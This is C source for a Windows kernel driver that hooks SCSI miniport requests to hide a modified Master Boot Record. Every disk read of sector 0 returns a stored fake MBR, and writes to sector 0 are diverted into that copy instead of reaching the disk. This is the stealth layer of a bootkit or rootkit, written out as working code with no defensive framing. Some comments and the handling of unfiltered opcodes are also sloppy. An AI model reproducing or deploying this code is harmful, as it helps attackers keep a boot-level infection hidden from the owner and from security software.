#include <Ntifs.h>
#include <srb.h>
#include <scsi.h>
#include "ScsiFilter.h"

//Called after a read request to the MBR has been processed
NTSTATUS MbrReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
	PVOID SystemMdlAddress;
	PIO_STACK_LOCATION StackLocation; 
	PCOMPLETION_CTX CompletionCtx;
	CHAR InvokeCompletion = FALSE;
	UCHAR Control;
	NTSTATUS IrpStatus, status = STATUS_SUCCESS;

	CompletionCtx = (PCOMPLETION_CTX)Context;
	StackLocation = IoGetCurrentIrpStackLocation(Irp);

	//If request was successful, we need to replace the real MBR inside buffer
	if(NT_SUCCESS(Irp->IoStatus.Status) && CompletionCtx->TransferLength > 0)
	{
		SystemMdlAddress = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
		if(SystemMdlAddress)
		{
			memcpy(SystemMdlAddress, FakeMbr, 512);
			DbgPrint("{CompletionRoutine} Disk read request was successful, replaced MBR in buffer %X\n", CompletionCtx->TransferLength);
		}
	}

	//Restore original completion routine information
	StackLocation->Context = CompletionCtx->OriginalContext;
	StackLocation->CompletionRoutine = CompletionCtx->OriginalRoutine;
	StackLocation->Control = CompletionCtx->OriginalControl;

	Control = StackLocation->Control;
	IrpStatus = Irp->IoStatus.Status;

	//If there is an original completion routine, check if it should be called
	if(StackLocation->CompletionRoutine)
	{
		if(NT_SUCCESS(IrpStatus) && (Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS)
			InvokeCompletion = TRUE;

		if(IrpStatus == STATUS_CANCELLED && (Control & SL_INVOKE_ON_CANCEL) == SL_INVOKE_ON_CANCEL)
			InvokeCompletion = TRUE;

		if(NT_ERROR(IrpStatus) && IrpStatus != STATUS_CANCELLED && 
			(Control & SL_INVOKE_ON_ERROR) == SL_INVOKE_ON_ERROR)
			InvokeCompletion = TRUE;
	}

	//Call original completion routine
	if(InvokeCompletion == TRUE)
		status = (StackLocation->CompletionRoutine)(DeviceObject, Irp, StackLocation->Context);

	ExFreePool(Context);
	return status;
}

//Handle SCSI WRITE(10) requests
NTSTATUS ScsiFilterWrite(PIRP Irp, PIO_STACK_LOCATION StackLocation, PSCSI_REQUEST_BLOCK Srb, PCDB Cdb)
{
	ULONG LBA;
	USHORT TransferLength;
	ULONG BufferOffset;
	PVOID SystemBuffer;
	KIRQL OldIrql;
	NTSTATUS status;

	//Extract logical block address and transfer length from Cdb and fix endian
	LBA = swap_endian<ULONG>(*(ULONG *)&Cdb->CDB10.LogicalBlockByte0);
	TransferLength = swap_endian<USHORT>(*(USHORT *)&Cdb->CDB10.TransferBlocksMsb);

	//Logical block address must be 0 for MBR
	if(Srb->DataTransferLength >= 512 && LBA == 0)
	{
		DbgPrint("{ScsiFilter} Intercepted MBR write request (LBA: %X, Size: %X)\n", LBA, TransferLength);

		//Calculate the offset into the MDL address that ScsiRequestBlock->DataBuffer points to
		BufferOffset = (ULONG)Srb->DataBuffer - (ULONG)MmGetMdlVirtualAddress(Irp->MdlAddress);
		SystemBuffer = (PVOID)((ULONG)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority) + BufferOffset);

		if(SystemBuffer)
		{
			//Write to the fake MBR (spin-lock is probably overkill here)
			KeAcquireSpinLock(&FakeMbrWriteLock, &OldIrql);
			memcpy(FakeMbr, SystemBuffer, 512);
			KeReleaseSpinLock(&FakeMbrWriteLock, OldIrql);

			//If the request was only trying to write the MBR, we can just complete the request ourselves
			if(Srb->DataTransferLength == 512)
			{
				Irp->IoStatus.Status = STATUS_SUCCESS;
				Irp->IoStatus.Information = NULL;
				Srb->SrbStatus = SRB_STATUS_SUCCESS;
				Srb->ScsiStatus = SCSISTAT_GOOD;

				//Complete IRP without calling real Miniport
				IoCompleteRequest(Irp, IO_NO_INCREMENT);
				return STATUS_SUCCESS;
			}

			//If the request was trying to read the MBR and more, we need to pass the rest of the request on
			else
			{
				//Edit request to only write the sector(s) after the MBR
				*(ULONG*)&Srb->DataBuffer += 512;
				Srb->DataTransferLength -= 512;
				*(USHORT *)&Cdb->CDB10.TransferBlocksMsb = swap_endian<USHORT>(TransferLength - 1);
				*(ULONG *)&Cdb->CDB10.LogicalBlockByte0 = swap_endian<ULONG >(LBA + 1);

				//Call original Miniport to process request
				status = OriginalScsi(TargetDevice, Irp);
				
				//A Driver may need the original DataBuffer
				*(ULONG*)&Srb->DataBuffer -= 512;

				//If request is successful, TransferLength is the bytes read from disk 
				//We add 512 bytes so it looks like the MBR was read from disk as well
				if(NT_SUCCESS(status))
					Srb->DataTransferLength += 512;

				return status;
			}
		}
	}
	return OriginalScsi(TargetDevice, Irp);
}

//Handle SCSI READ(10) requests
NTSTATUS ScsiFilterRead(PIRP Irp, PIO_STACK_LOCATION StackLocation, PSCSI_REQUEST_BLOCK Srb, PCDB Cdb)
{
	PCOMPLETION_CTX CompletionCtx;
	ULONG LBA;
	USHORT TransferLength;
	
	//Extract logical block address and transfer length from Cdb and fix endian
	LBA = swap_endian<ULONG>(*(ULONG *)&Cdb->CDB10.LogicalBlockByte0);
	TransferLength = swap_endian<USHORT>(*(USHORT *)&Cdb->CDB10.TransferBlocksMsb);

	//Logical block address must be 0 (MBR)
	if(LBA == 0 && TransferLength > 0)
	{
		DbgPrint("{ScsiFilter} Intercepted MBR read request (LBA: %X, Size: %X)\n", LBA, TransferLength);

		//Set up structure to be passed to completion routine
		CompletionCtx = (PCOMPLETION_CTX)ExAllocatePool(NonPagedPool, sizeof(COMPLETION_CTX));
		if(CompletionCtx)
		{
			//Store original completion routine info, so we can call it after
			CompletionCtx->OriginalContext = StackLocation->Context;
			CompletionCtx->OriginalRoutine = StackLocation->CompletionRoutine;
			CompletionCtx->OriginalControl = StackLocation->Control;

			//Store LBA and TransferLength for use in completion routine
			CompletionCtx->LBA = LBA;
			CompletionCtx->TransferLength = TransferLength;

			//Set up completion routine
			StackLocation->Context = CompletionCtx;
			StackLocation->CompletionRoutine = &MbrReadComplete;
			StackLocation->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;

			DbgPrint("{ScsiFilter} Added completion routine\n");
		}
	}

	return OriginalScsi(TargetDevice, Irp);
}

//Filter IRP_MJ_SCSI requests to Miniport
NTSTATUS ScsiFilter(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	PIO_STACK_LOCATION StackLocation;
	PSCSI_REQUEST_BLOCK Srb;
	PCDB Cdb;
	NTSTATUS status;

	//Only process requests for the target Miniport device
	if(DeviceObject != TargetDevice)
		return OriginalScsi(DeviceObject, Irp);

	StackLocation = IoGetCurrentIrpStackLocation(Irp);
	Srb = StackLocation->Parameters.Scsi.Srb;
	Cdb = (PCDB)Srb->Cdb;

	//SCSI READ(10) and WRITE(10) are all we need to handle on disks < 2TB
	if(Srb->CdbLength != 10)
		return OriginalScsi(DeviceObject, Irp);

	//If it's an read request, pass it to our read handler
	if(Cdb->CDB10.OperationCode == SCSIOP_READ || Cdb->CDB10.OperationCode == SCSIOP_READ_DATA_BUFF)
		status = ScsiFilterRead(Irp, StackLocation, Srb, Cdb);

	//If it's a write request, pass it to our write handler
	else if(Cdb->CDB10.OperationCode == SCSIOP_WRITE || Cdb->CDB10.OperationCode == SCSIOP_WRITE_DATA_BUFF)
		status = ScsiFilterWrite(Irp, StackLocation, Srb, Cdb);
	
	return status;
}